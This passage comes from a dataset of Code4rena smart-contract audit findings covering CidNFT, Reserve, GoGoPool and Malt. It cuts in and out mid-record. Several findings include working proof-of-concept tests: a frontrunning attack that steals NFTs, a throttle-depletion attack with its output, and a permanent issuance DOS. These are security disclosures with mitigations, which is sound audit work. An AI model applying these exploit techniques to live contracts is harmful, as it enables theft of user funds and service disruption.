string(abi.encodePacked(baseURI, _id, \".json\"));     }  ```  This means the raw bytes of the 32-byte ABI encoded integer `_id` will be interpolated into the token URI, e.g. `0x0000000000000000000000000000000000000000000000000000000000000001` for ID #1.   Most of the resulting UTF-8 strings will be malformed, incorrect, or invalid URIs. For example, token ID #1 will show up as the invisible \"start of heading\" control character, and ID #42 will show as the asterisk symbol `*`. URI-unsafe characters will break the token URIs altogether.  **Impact** - `CidNFT` tokens will have invalid `tokenURI`s. Offchain tools that read the `tokenURI` view may break or display malformed data.  **Suggestion**  Convert the `_id` to a string before calling `abi.encodePacked`. Latest Solmate includes a `LibString` helper library for this purpose:  ```solidity     import \"solmate/utils/LibString.sol\";      /// @notice Get the token URI for the provided ID     /// @param _id ID to retrieve the URI for     /// @return tokenURI The URI of the queried token (path to a JSON file)     function tokenURI(uint256 _id) public view override returns (string memory) {         if (ownerOf[_id] == address(0))             // According to ERC721, this revert for non-existing tokens is required             revert TokenNotMinted(_id);         return string(abi.encodePacked(baseURI, LibString.toString(_id), \".json\"));     }  ```  **Test case**  ```solidity     function test_InvalidTokenURI() public {         uint256 id1 = cidNFT.numMinted() + 1;         uint256 id2 = cidNFT.numMinted() + 2;         // mint id1         cidNFT.mint(new bytes[](0));         // mint id2         cidNFT.mint(new bytes[](0));          // These pass \u2014 the raw bytes '0000000000000000000000000000000000000000000000000000000000000001' are interpolated as _id.         assertEq(string(bytes(hex\"7462643a2f2f626173655f7572692f00000000000000000000000000000000000000000000000000000000000000012e6a736f6e\")), cidNFT.tokenURI(id1));         assertEq(string(bytes(hex\"7462643a2f2f626173655f7572692f00000000000000000000000000000000000000000000000000000000000000022e6a736f6e\")), cidNFT.tokenURI(id2));          // These fail - the generated string on the right is not the expected string on the left.          assertEq(\"tbd://base_uri/1.json\", cidNFT.tokenURI(id1));         assertEq(\"tbd://base_uri/2.json\", cidNFT.tokenURI(id2));     } ```"}, {"title": "Attacker can frontrun a victim's mint+add transaction to steal NFT", "html_url": "https://github.com/code-423n4/2023-01-canto-identity-findings/issues/67", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "edited-by-warden", "H-01"], "target": "2023-01-canto-identity-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-01-canto-identity/blob/main/src/CidNFT.sol#L147 https://github.com/code-423n4/2023-01-canto-identity/blob/main/src/CidNFT.sol#L165 https://github.com/code-423n4/2023-01-canto-identity/blob/main/src/CidNFT.sol#L237   # Vulnerability details  ## Impact High - an attacker can steal deposited NFTs from victims using the `mint()` + `add()` functionality in `CidNFT.sol`  ## Proof of Concept  One of the core features of CID Protocol is the ability for users to attach Subprotocol NFTs to their `CidNFT`. The `CidNFT` contract custodies these attached NFTs, and they are regarded as \"traits\" of the user.   The protocol currently includes functionality for a user to mint a `CidNFT` as their identity and then optionally add a subprotocol NFT to that `CidNFT` in the same transaction. This occurs in the `mint()` function of `CidNFT.sol`, which takes a byte array of `add()` parameters and includes a loop where `add()` can be repeatedly called with these parameters to attach subprotocol NFTs to the `CidNFT`.  ```  function mint(bytes[] calldata _addList) external {     _mint(msg.sender, ++numMinted);      bytes4 addSelector = this.add.selector;     for (uint256 i = 0; i < _addList.length; ++i) {         (bool success /*bytes memory result*/, ) = address(this)             .delegatecall(abi.encodePacked(addSelector, _addList[i]));         if (!success) revert AddCallAfterMintingFailed(i);     } } ``` One of the arguments for `add()` is the `_cidNFTID` to which the user would like to attach their outside NFT. However, `_cidNFTID` is specified in calldata to `mint()`, and there is no guarantee that the user is actually `add()`ing to the `CidNFT` that they just minted. There is only a check in `add()` that the user is either the owner or approved for that `CidNFT`.    ``` function add(         uint256 _cidNFTID, // No guarantee that this is the CidNFT id that was just minted by the user         string calldata _subprotocolName,         uint256 _key,         uint256 _nftIDToAdd,         AssociationType _type     ) external {     ...............     if (         cidNFTOwner != msg.sender &&         getApproved[_cidNFTID] != msg.sender &&         !isApprovedForAll[cidNFTOwner][msg.sender]     ) revert NotAuthorizedForCIDNFT(msg.sender, _cidNFTID, cidNFTOwner);     ............... } ```  This opens up the following attack:  1. Victim sends a transaction expecting to mint `CidNFT #100`, and includes calldata to `add()` their SubprotocolNFT to the token in the same tx 2. Attacker frontruns this transaction with a `mint()` with no `add()` parameters, receives `CidNFT #100`, and sets the victim as approved for that token 3. The victim's transaction begins execution, and they instead receive token #101, though their `add()` calldata still specifies token #100 4. The victim's `add()` call continues, and their SubprotocolNFT is registered to `CidNFT #100` and transferred to the `CidNFT` contract 5. The attacker can then either revoke approval to the victim for `CidNFT #100` or immediately call `remove()` to transfer the victim's SubprotocolNFT to themselves  Below is a forge test executing this attack. This should run if dropped into `CidNFT.t.sol`. ``` function testMaliciousMint() public {     uint256 cidTokenId = cidNFT.numMinted() + 1;     (uint256 subTokenId1, uint256 subTokenId2) = (1, 2);     (uint256 key1, uint256 key2) = (1, 2);      // user1 == attacker     // user2 == victim     // Frontrun the victim's mint by minting the cidNFT token they expect before them     vm.startPrank(user1);     cidNFT.mint(new bytes[](0));      // Set the victim (user2) as approved for the token user1 just minted     cidNFT.setApprovalForAll(user2, true);     vm.stopPrank();      // Mint user2 the subtokens that user1 wants to steal, approve the CidNFT contract     // for the subtokens, and prepare the addlist with the incorrect cidNFT token id     vm.startPrank(user2);     sub1.mint(user2, subTokenId1);     sub1.mint(user2, subTokenId2);     sub1.setApprovalForAll(address(cidNFT), true);      bytes[] memory addList = new bytes[](2);     addList[0] = abi.encode(         cidTokenId,         \"sub1\",         key1,         subTokenId1,         CidNFT.AssociationType.ORDERED     );     addList[1] = abi.encode(         cidTokenId,         \"sub1\",         key2,         subTokenId2,         CidNFT.AssociationType.ORDERED     );      // Mint user2 a new CidNFT and attach the subtokens to user1's CidNFT     cidNFT.mint(addList);     vm.stopPrank();      // Confirm that user1's CidNFT has the subtokens and can transfer them out     vm.startPrank(user1);     cidNFT.remove(         cidTokenId,         \"sub1\",         key1,         subTokenId1,         CidNFT.AssociationType.ORDERED     );     cidNFT.remove(         cidTokenId,         \"sub1\",         key2,         subTokenId2,         CidNFT.AssociationType.ORDERED     );     vm.stopPrank();      // Confirm that user1 now holds the subtokens     assertEq(cidNFT.ownerOf(cidTokenId), user1);     assertEq(cidNFT.ownerOf(cidTokenId + 1), user2);     assertEq(sub1.ownerOf(subTokenId1), user1);     assertEq(sub1.ownerOf(subTokenId2), user1); } ## Tools Used Manual review  ## Recommended Mitigation Steps - Enforce that the user can only `add()` to the CidNFT that they just minted rather than allowing for arbitrary IDs"}, {"title": "Attacker can temporary deplete available redemption/issuance by running issuance then redemption or vice versa", "html_url": "https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/79", "labels": ["2 (Med Risk)", "satisfactory", "selected for report", "sponsor confirmed", "MR-NEW"], "target": "2023-02-reserve-mitigation-contest-findings", "body": "# Lines of code  https://github.com/reserve-protocol/protocol/blob/610cfca553beea41b9508abbfbf4ee4ce16cbc12/contracts/libraries/Throttle.sol#L66-L75   # Vulnerability details  ## Impact Attacker can deplete available issuance or redemption by first issuing and then redeeming in the same tx or vice versa. The available redemption/issuance will eventually grow back, but this temporary reduces the available amount. This can also use to front run other user who tries to redeem/issue in order to fail their tx.   ## Proof of Concept In the PoC below a user is able to reduce the redemption available by more than 99% (1e20 to 1e14), and that's without spending anything but gas (they end up with the same amount of RToken as before)    ```diff diff --git a/test/RToken.test.ts b/test/RToken.test.ts index e04f51db..33044b79 100644 --- a/test/RToken.test.ts +++ b/test/RToken.test.ts @@ -1293,6 +1293,31 @@ describe(`RTokenP${IMPLEMENTATION} contract`, () => {            )          })   +        it('PoC', async function () { +          const rechargePerBlock = config.issuanceThrottle.amtRate.div(BLOCKS_PER_HOUR); + +          advanceTime(60*60*5); + +          let totalSupply =  await rToken.totalSupply(); +          let redemptionAvailable = await rToken.redemptionAvailable(); +          let issuanceAvailable = await rToken.issuanceAvailable(); + +          console.log({redemptionAvailable, issuanceAvailable, totalSupply}); + +          let toIssue = redemptionAvailable.mul(111111n).div(100000n); +          await rToken.connect(addr1).issue(toIssue); +          await rToken.connect(addr1).redeem(toIssue, true); + + + +          redemptionAvailable = await rToken.redemptionAvailable(); +          issuanceAvailable = await rToken.issuanceAvailable(); +          console.log(\"after\", {redemptionAvailable, issuanceAvailable}); +          return; + +        }); +        return; +          it('Should update issuance throttle correctly on redemption', async function () {            const rechargePerBlock = config.issuanceThrottle.amtRate.div(BLOCKS_PER_HOUR)   @@ -1335,6 +1360,7 @@ describe(`RTokenP${IMPLEMENTATION} contract`, () => {        })      })    }) +  return;      describe('Melt/Mint #fast', () => {      const issueAmount: BigNumber = bn('100e18')  ```  Output: ``` {   redemptionAvailable: BigNumber { value: \"10000000000000000000\" }, // 1e20   issuanceAvailable: BigNumber { value: \"1000000000000000000000000\" },   totalSupply: BigNumber { value: \"100000000000000000000\" } } after {   redemptionAvailable: BigNumber { value: \"10000000000000\" }, // 1e14   issuanceAvailable: BigNumber { value: \"1000000000000000000000000\" } } ```  ## Recommended Mitigation Steps Mitigating this issue seems a bit tricky. One way is at the end of `currentlyAvailable()` to return the max of `available` and `throttle.lastAvailable` (up to some limit, in order not to allow to much of it to accumulate)."}, {"title": "AssetRegistry cannot disable a bad asset.", "html_url": "https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/73", "labels": ["satisfactory", "selected for report", "sponsor confirmed", "MR-M-16"], "target": "2023-02-reserve-mitigation-contest-findings", "body": "# Lines of code  https://github.com/reserve-protocol/protocol/blob/27a3472d553b4fa54f896596007765ec91941348/contracts/p1/AssetRegistry.sol#L91-L104   # Vulnerability details  ## Impact The AssetRegistry contains an `unregister` function which can be used to detach a bad collateral from the RToken system.  Previously [M-16](https://github.com/code-423n4/2023-01-reserve-findings/issues/254) was reported as an issue for the RToken system in which a single bad collateral can stop the working of RToken protocol.  To fix M-16, the `basketHandler.quantity` call was wrapped in a `try/catch` block so that the statement can handle any unexpected revert from the collateral contract.  While the fix handles unexpected reverts, it misses the case which the `basketHandler.quantity` call may consume the entire transaction gas.  So, if for some reasons the Collateral contract start consuming more gas than the allowed block gas limit, the `basketHandler.quantity` call will always fail, resulting in the revert of `unregister` call.  This essentially prevent governance from unregistering a collateral from the RToken. The unregistering of a collateral is still dependent upon the code execution of the collateral token contract.   ## Proof of Concept Consider this scenario:   - TokenA was registered as an asset in AssetRegistry.  - Due to an upgrade/bug/hack the TokenA starts consuming all available gas on function calls.  - The RToken governance decides to unregister the TokenA asset and calls the `AssetRegistry.unregister` function.  - Internal call chain invokes any function of TokenA contract. The txn reverts with an out of gas error.  - The governance is now unable to unregister TokenA from RToken protocol and RToken is now unusable.  ## Tools Used Manual review  ## Recommended Mitigation Steps Consider detaching the interaction with collateral contract completely from the unregistering contract flow. Unregistering a contract must never depend upon the code execution of Collateral token contract."}, {"title": "Mitigation of M-04: Issue not fully mitigated", "html_url": "https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/54", "labels": ["mitigation-confirmed", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "MR-M-04"], "target": "2023-02-reserve-mitigation-contest-findings", "body": "# Lines of code  https://github.com/reserve-protocol/protocol/blob/610cfca553beea41b9508abbfbf4ee4ce16cbc12/contracts/p1/RToken.sol#L215   # Vulnerability details  ### Original issue: [M-04: Redemptions during undercollateralization can be hot-swapped to steal all funds)](https://github.com/code-423n4/2023-01-reserve-findings/issues/399)  ## Impact User might be agreeing to a partial redemption expecting to lose only a small fraction, but end up losing a significantly higher fraction.  ### Details  * Issue was that user might get only partial redemption when they didn't intend to - they sent a tx to the pool, in the meanwhile an asset got disabled and replaced. Redeemer doesn't get any share of the disabled collateral, and the backup collateral balance is zero. * Mitigation adds a parameter named `revertOnPartialRedemption`, if the parameter is false the redeeming would revert if any collateral holds only part of the asset. * This is suppose to solve this issue since in the case above the user would set it to false and the redeeming tx would revert * The issue is that there might be a case where the protocol holds only a bit less than the quantity required (e.g. 99%), and in that case the user would be setting `revertOnPartialRedemption` to true, expecting to get 99% of the value of the basket. Then if an asset is disabled and replaced the user would suffer a loss much greater than they've agreed to.  ## PoC ### Likelihood Mostly the protocol wouldn't be undercollateralized for a long time, since there would either by trading going on to cover it or eventually there would be a haircut. But there can still be periods of time where this happens: * Governance increased the basket quantity of one asset a bit (expecting the yield to cover for it), trading won't start till `tradingDelay` passes. Meaning a few hours where only partial redemption would be possible. * Another asset got disabled first, and replaced by a backup asset. The protocol either had enough balance of the backup asset or covered up for it via trading. Yet again, this won't last long since eventually all trading would complete and the protocol would go to a haircut, but there can be multiple trading of multiple assets which would make it last up to a few hours.   ## Mitigation The ideal solution would be to allow the user to specify the min amount for each asset or the min ratio of the between the total redemption value and the basket value, but that would be too expensive and complicated. I think the middle way here would be to replace `revertOnPartialRedemption` parameter with a single numeric parameter that specifies the min ratio that the user expects to get (i.e. if that parameter is set to 90%, that means that if any asset holds less than 90% than the quantity it should the redemption would revert). This shouldn't cost much more gas, and would cover most of the cases."}, {"title": "Mitigation of H-02: Issue not fully mitigated", "html_url": "https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/49", "labels": ["3 (High Risk)", "satisfactory", "selected for report", "sponsor confirmed", "MR-H-02"], "target": "2023-02-reserve-mitigation-contest-findings", "body": "# Lines of code  https://github.com/reserve-protocol/protocol/blob/610cfca553beea41b9508abbfbf4ee4ce16cbc12/contracts/p1/mixins/RecollateralizationLib.sol#L146-L245   # Vulnerability details  # Mitigation of H-02: Issue not fully mitigated ### Original issue: [H-02: Basket range formula is inefficient, leading the protocol to unnecessary haircut](https://github.com/code-423n4/2023-01-reserve-findings/issues/235)   ## Not mitigated - top range can still be too high, leading to unnecessary haircut * The applied mitigation follows the line of the mitigation suggested (disclosure: by me :)) in the original issue, however after reviewing it I found out that it doesn't fully mitigate the issue. * The original issue was that basket range band is too wide, with both top range being too high and bottom range too low * The bottom range is mitigated now * As for the top range - even though it's more efficient now, it still can result in a top range that doesn't make sense.  ## Impact Protocol might go for an unnecessary haircut, causing a loss for RToken holders. In the scenario below we can trade to get ~99% of baskets needed, but instead the protocol goes for a 50% haircut.  After the haircut the baskets held per supply ratio might grow back via `handoutExcessAssets` and `Furnace` however: * Not all excess asset goes to `Furnace` * `Furnace` grows slowly over time and in the meantime     * Redemption would be at the lower baskets per supply     * New users can issue in the meanwhile, diluting the melting effect  In more extreme cases the baskets held can be an extremely low number that might even cause the haircut to fail due to `exchangeRateIsValidAfter` modifier on `setBasketsNeeded()`. This would mean trading would be disabled till somebody sends enough balance to the undercollateralized asset.      ## PoC  Consider the following scenario: * A basket is composed of 30 USDc and 1 ETH * The prices are:     * 1 USDc = 1 USD     * ETH = 1500 USD * Therefore the total basket value is 1515 USD * Protocol holds 1000 baskets * Governance changes the USDC quantity to 30 USDC * Baskets held now is only 500, since we hold only 15K USDC * Bottom range would be `basketsHeld + (excess_ETH * ETH_lowPrice / basket_highPrice) = 500 + (1500 * 500 * 0.99 / (1530 * 1.01)) = 980` * Top range would be `basketsHeld + (excess_ETH * ETH_highPrice / basket_lowPrice) = 500 + (1500 * 500 * 1.01 / (1530 * 0.99)) = 1000` * This is clearly a wrong estimation, which would lead to a haircut of 50% (!) rather than going for a trade.  Note: I mentioned governance change for simplicity, but this can also happen without governance intervention when a collateral gets disabled, it's value declines and a backup asset kicks in (at first the disabled asset would get traded and cover up some of the deficit and then we'd go for a haircut)  ## Mitigation * A more efficient formula would be to use the max baskets held (i.e. the maximum of (each collateral balance divided by the basket_quantity of that collateral)) and then subtract from that the lowest estimation of baskets missing (i.e. lowest value estimation of needed assets to reach that amount divided by highest estimation of basket value).     * In the case above that would mean `maxBasketsHeld - (USDC_deficit * USDC_lowPrice / basket_highPrice) = 1000 - (500 * 30 * 0.99 / (1530 * 1.01)) = 990.4`. Freeing up 9.6 ETH for sale * The suggested formula might get us a higher top range estimation when the case is the other way around (the collateral that makes the larger part of the basket value is missing, in our case ETH is missing and USDC not), but it wouldn't result in a haircut and still go for trading (since the top range would be closer to baskets held)   Even with the mitigation above there can be extreme cases where a single asset holds a very small fraction of the total basket value (e.g. 0.1%) and the mitigation wouldn't help much in this case. There might be a need to come up with a broader mitigation for the issue that haircut is done to the number of baskets held rather than bottom range even though the difference between the two can be significant. Or set a threshold for the fraction of the value that each collateral holds in the total value of the basket. "}, {"title": "Early attacker can DOS rToken issuance", "html_url": "https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/13", "labels": ["2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "edited-by-warden", "MR-M-05"], "target": "2023-02-reserve-mitigation-contest-findings", "body": "# Lines of code  https://github.com/reserve-protocol/protocol/blob/27a3472d553b4fa54f896596007765ec91941348/contracts/p1/RToken.sol#L308-L312 https://github.com/reserve-protocol/protocol/blob/27a3472d553b4fa54f896596007765ec91941348/contracts/p1/RToken.sol#L132   # Vulnerability details  ## Impact An early attacker can DOS the `issue` functionality in the `RToken` contract.    No issuances can be made. And the DOS cannot be recovered from. It is permanent.    ## Proof of Concept You can add the following test to the `Furnace.test.ts` file and execute it with `yarn hardhat test --grep 'M-05 Mitigation Error: DOS issue'`.    ```typescript describe('M-05 Mitigation Error', () => {     beforeEach(async () => {       // Approvals for issuance       await token0.connect(addr1).approve(rToken.address, initialBal)       await token1.connect(addr1).approve(rToken.address, initialBal)       await token2.connect(addr1).approve(rToken.address, initialBal)       await token3.connect(addr1).approve(rToken.address, initialBal)        await token0.connect(addr2).approve(rToken.address, initialBal)       await token1.connect(addr2).approve(rToken.address, initialBal)       await token2.connect(addr2).approve(rToken.address, initialBal)       await token3.connect(addr2).approve(rToken.address, initialBal)        // Issue tokens       const issueAmount: BigNumber = bn('100e18')       // await rToken.connect(addr1).issue(issueAmount)       // await rToken.connect(addr2).issue(issueAmount)     })      it('M-05 Mitigation Error: DOS issue', async () => {       /* attack vector actually so bad that attacker can block issuance a loooong time?       */       console.log(\"Total supply\");       console.log(await rToken.totalSupply());        const issueAmount: BigNumber = bn('1e17')       await rToken.connect(addr1).issue(issueAmount)        console.log(\"Total supply\");       console.log(await rToken.totalSupply());        const transferAmount: BigNumber = bn('1e16')       rToken.connect(addr1).transfer(furnace.address, transferAmount);        await advanceTime(3600);        await furnace.connect(addr1).melt()              await advanceTime(3600);        console.log(\"rToken balance of furnace\");       console.log(await rToken.balanceOf(furnace.address));        /* rToken can not be issued       */        await expect(rToken.connect(addr1).issue(issueAmount)).to.be.revertedWith('rToken supply too low to melt')        console.log(\"rToken balance of furnace\");       console.log(await rToken.balanceOf(furnace.address));        /* rToken can not be issued even after time passes       */        await advanceTime(3600);        await expect(rToken.connect(addr1).issue(issueAmount)).to.be.revertedWith('rToken supply too low to melt')        /* rToken.melt cannot be called directly either       */        await expect(rToken.connect(addr1).melt(transferAmount)).to.be.revertedWith('rToken supply too low to melt')     })   }) ```  The attack performs the following steps:    1. Issue `1e17` rToken 2. Transfer `1e16` rToken to the furnace 3. Wait 12 seconds and call `Furnace.melt` such that the furnace takes notice of the transferred rToken and can pay them out later 4. Wait at least 12 seconds such that the furnace would actually call `RToken.melt` 5. Now `RToken.issue` and `RToken.melt` are permanently DOSed  ## Tools Used VSCode  ## Recommended Mitigation Steps Use a try-catch block for `furnace.melt` in the `RToken.issueTo` function.    ```diff diff --git a/contracts/p1/RToken.sol b/contracts/p1/RToken.sol index 616b1532..fc584688 100644 --- a/contracts/p1/RToken.sol +++ b/contracts/p1/RToken.sol @@ -129,7 +129,7 @@ contract RTokenP1 is ComponentP1, ERC20PermitUpgradeable, IRToken {          // Ensure SOUND basket          require(basketHandler.status() == CollateralStatus.SOUND, \"basket unsound\");   -        furnace.melt(); +        try main.furnace().melt() {} catch {}          uint256 supply = totalSupply();            // Revert if issuance exceeds either supply throttle ```  The only instance when `furnace.melt` reverts is when the `totalSupply` is too low. But then it is ok to catch the exception and just continue with the issuance and potentially lose rToken appreciation.    Potentially losing some rToken appreciation is definitely better than having this attack vector.    The `RToken.redeemTo` function already has the call to the `furnance.melt` function wrapped in a try-catch block. So redemption cannot be DOSed.   "}, {"title": "There is no way to retrieve the rewards from the `MultisigManager` and rewards are locked in the vault.", "html_url": "https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/46", "labels": ["2 (Med Risk)", "primary issue", "selected for report", "sponsor confirmed", "MR-M-21"], "target": "2023-02-gogopool-mitigation-contest-findings", "body": "# Lines of code  https://github.com/multisig-labs/gogopool/blob/4bcef8b1d4e595c9ba41a091b2ebf1b45858f022/contracts/contract/RewardsPool.sol#L229   # Vulnerability details  # C4 issue  M-21: [Division by zero error can block RewardsPool#startRewardCycle if all multisig wallet are disabled.](https://github.com/code-423n4/2022-12-gogopool-findings/issues/143)  # Comments The protocol provides an external function `startRewardsCycle()` so that anyone can start a new reward cycle if necessary. Before mitigation, there was an edge case where this function will revert due to division by zero. Edge case: there is no multisigs enabled. (possible when `Ocyticus.disableAllMultisigs(), Ocyticus.pauseEverything()` is called)  # Mitigation [PR #37](https://github.com/multisig-labs/gogopool/pull/37) If no multisig is enabled, the mitigation sends the rewards to the `MultisigManager` and it makes sense. But this created another issue. There is no way to retrieve the rewards back from the `MultisigManager`.  # New issue There is no way to retrieve the rewards from the `MultisigManager` and rewards are locked in the vault.  # Code snippet https://github.com/multisig-labs/gogopool/blob/4bcef8b1d4e595c9ba41a091b2ebf1b45858f022/contracts/contract/RewardsPool.sol#L229  # Impact There is no way to retrieve the rewards from the `MultisigManager` and rewards are locked in the vault.  # Proof of Concept The rewards that were accrued in this specific edge case are locked in the `MultisigManager`. It is understood that the funds are not lost and the protocol can be upgraded with a new `MultisigManager` contract with a proper function. I evaluate the severity of the new issue as Medium because funds are locked in some specific edge cases and only withdrawable after contract upgrades.  # Tools used Manual Review  # Recommended additional mitigation Add a new external function in the `MultisigManager` with `guardianOrSpecificRegisteredContract(\"Ocyticus\", msg.sender)` modifier and distribute the pending rewards to the active multisigs.  # Conclusion Mitigation error - created another issue for the same edge case.  "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-02-malt-findings/issues/43", "labels": ["bug", "G (Gas Optimization)", "grade-a", "sponsor confirmed", "G-01"], "target": "2023-02-malt-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-02-malt-findings/blob/main/data/hansfriese-G.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-02-malt-findings/issues/42", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "selected for report", "sponsor confirmed", "Q-01"], "target": "2023-02-malt-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-02-malt-findings/blob/main/data/hansfriese-Q.md)."}, {"title": "`priceTarget` is inconsistent in `StabilizerNode.stabilize`", "html_url": "https://github.com/code-423n4/2023-02-malt-findings/issues/40", "labels": ["bug", "2 (Med Risk)", "satisfactory", "selected for report", "sponsor confirmed", "M-01"], "target": "2023-02-malt-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-02-malt/blob/main/contracts/StabilityPod/StabilizerNode.sol#L178-L182 https://github.com/code-423n4/2023-02-malt/blob/main/contracts/StabilityPod/StabilizerNode.sol#L294-L298 https://github.com/code-423n4/2023-02-malt/blob/main/contracts/StabilityPod/StabilizerNode.sol#L188   # Vulnerability details  ## Impact `priceTarget` is inconsistent in `StabilizerNode.stabilize` so `stabilize` can do auction instead of selling malt and vice versa.  ## Proof of Concept  In `StabilizerNode.stabilize`, there is an early check using `_shouldAdjustSupply` function.   ```     if (!_shouldAdjustSupply(exchangeRate, stabilizeToPeg)) {       lastStabilize = block.timestamp;       impliedCollateralService.syncGlobalCollateral();       return;     } ```  In `_shouldAdjustSupply`, `priceTarget` is calculated by `stabilizeToPeg` and then check if `exchangeRate` is outside of some margin of `priceTarget`.  ```     if (stabilizeToPeg) {       priceTarget = maltDataLab.priceTarget();     } else {       priceTarget = maltDataLab.getActualPriceTarget();     } ```  But in `stabilize`, `priceTarget` is always actual price target of `maltDataLab` regardless of `stabilizeToPeg`. And it decides selling malt or doing auction by the `priceTarget`. So when `stabilizeToPeg` is true, `priceTarget` (= actual price target) can be different from `maltDataLab.priceTarget()` in most cases, and it can cause wrong decision of selling or starting auction after that.   ```     uint256 priceTarget = maltDataLab.getActualPriceTarget(); ``` So when `stabilizeToPeg` is true, `stabilize` can do auction instead of selling malt, or vice versa.   ## Tools Used Manual Review  ## Recommended Mitigation Steps Use same logic as `_shouldAdjustSupply` for `priceTarget`. `priceTarget` should be `maltDataLab.priceTarget()` in `stabilize` when `stabilizeToPeg` is true. "}, {"title": "The latest malt price can be less than the actual price target and `StabilizerNode.stabilize` will revert", "html_url": "https://github.com/code-423n4/2023-02-malt-findings/issues/36", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-02"], "target": "2023-02-malt-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-02-malt/blob/main/contracts/StabilityPod/StabilizerNode.sol#L188 https://github.com/code-423n4/2023-02-malt/blob/main/contracts/StabilityPod/StabilizerNode.sol#L201-L203   # Vulnerability details  ## Impact `StabilizerNode.stabilize` will revert when `latestSample < priceTarget`.  ## Proof of Concept In StabilizerNode.stabilize, when `exchangeRate > priceTarget` and `_msgSender` is not an admin and not whitelisted, it asserts `livePrice > minThreshold`. And `minThreshold` is calculated as follows: ```     uint256 priceTarget = maltDataLab.getActualPriceTarget(); ``` ```         uint256 latestSample = maltDataLab.maltPriceAverage(0);         uint256 minThreshold = latestSample -           (((latestSample - priceTarget) * sampleSlippageBps) / 10000); ``` This code snippet assumes that `latestSample >= priceTarget`. Although `exchangeRate > priceTarget`, `exchangeRate` is the malt average price during `priceAveragePeriod`. But `latestSample` is one of those malt prices. So `latestSample` can be less than `exchangeRate` and `priceTarget`, so `stabilize` will revert in this case.  ## Tools Used Manual Review  ## Recommended Mitigation Steps  Use `minThreshold = latestSample + (((priceTarget - latestSample) * sampleSlippageBps) / 10000)` when `priceTarget > latestSample`."}, {"title": "`LinearDistributor.declareReward` can revert due to dependency of balance", "html_url": "https://github.com/code-423n4/2023-02-malt-findings/issues/35", "labels": ["bug", "2 (Med Risk)", "downgraded by judge", "satisfactory", "selected for report", "sponsor confirmed", "M-03"], "target": "2023-02-malt-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-02-malt/blob/main/contracts/RewardSystem/LinearDistributor.sol#L147-L151 https://github.com/code-423n4/2023-02-malt/blob/main/contracts/RewardSystem/LinearDistributor.sol#L185-L186 https://github.com/code-423n4/2023-02-malt/blob/main/contracts/RewardSystem/LinearDistributor.sol#L123-L136   # Vulnerability details  ## Impact `LinearDistributor.declareReward` will revert and it can cause permanent DOS.  ## Proof of Concept  In `LinearDistributor.declareReward`, if the balance is greater than the bufferRequirement, the rest will be forfeited.   ```     if (balance > bufferRequirement) {       // We have more than the buffer required. Forfeit the rest       uint256 net = balance - bufferRequirement;       _forfeit(net);     } ```  And in `_forfeit`, it requires forfeited (= balance - bufferRequirement) <= declaredBalance.  ```   function _forfeit(uint256 forfeited) internal {     require(forfeited <= declaredBalance, \"Cannot forfeit more than declared\"); ```  So when an attacker sends some collateral tokens to `LinearDistributor`, the balance will be increased and it can cause revert in `_forfeit` and `declareReward`.  Since `declareReward` sends vested amount before `_forfeit` and the vested amount will be increased by time, so this DOS will be temporary.   ```     uint256 distributed = (linearBondedValue * netVest) / vestingBondedValue;     uint256 balance = collateralToken.balanceOf(address(this));      if (distributed > balance) {       distributed = balance;     }       if (distributed > 0) {       // Send vested amount to liquidity mine       collateralToken.safeTransfer(address(rewardMine), distributed);       rewardMine.releaseReward(distributed);     }      balance = collateralToken.balanceOf(address(this)); ``` But if the attacker increases the balance enough to cover all reward amount in vesting, `declareReward` will always revert and it can cause permanent DOS.  `decrementRewards` updates `declaredBalance`, but it only decreases `declaredBalance`, so it can't mitigate the DOS.  ## Tools Used Manual Review  ## Recommended Mitigation Steps Track collateral token balance and add sweep logic for unused collateral tokens in `LinearDistributor`."}, {"title": "`SwingTraderManager.swingTraders()` shoudn't contain duplicate `traderContract`s.", "html_url": "https://github.com/code-423n4/2023-02-malt-findings/issues/34", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-04"], "target": "2023-02-malt-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-02-malt/blob/main/contracts/StabilityPod/SwingTraderManager.sol#L36   # Vulnerability details  ## Impact If `SwingTraderManager.swingTraders()` contains duplicate `traderContract`s, several functions like `buyMalt()` and `sellMalt()` wouldn't work as expected as they work according to traders' balances.  ## Proof of Concept During the swing trader addition, there is no validation that each trader should have a unique `traderContract`.  ```solidity   function addSwingTrader(     uint256 traderId,     address _swingTrader, //@audit should be unique     bool active,     string calldata name   ) external onlyRoleMalt(ADMIN_ROLE, \"Must have admin privs\") {     SwingTraderData storage trader = swingTraders[traderId];     require(traderId > 2 && trader.id == 0, \"TraderId already used\");     require(_swingTrader != address(0), \"addr(0)\");      swingTraders[traderId] = SwingTraderData({       id: traderId,       index: activeTraders.length,       traderContract: _swingTrader,       name: name,       active: active     });      activeTraders.push(traderId);      emit AddSwingTrader(traderId, name, active, _swingTrader);   } ```  So the same `traderContract` might have 2 or more `traderId`s.  When we check `buyMalt()` as an example, it distributes the ratio according to the trader balance and it wouldn't work properly if one trader contract is counted twice and receives more shares that it can't manage.  Similarly, other functions wouldn't work as expected and return the wrong result.  ## Tools Used Manual Review  ## Recommended Mitigation Steps Recommend adding a new mapping like `activeTraderContracts` to check if the contract is added already or not.  Then we can check the trader contract is added only once."}, {"title": "`StabilizerNode.stabilize()` should update `lastTracking` as well to avoid an unnecessary incentive.", "html_url": 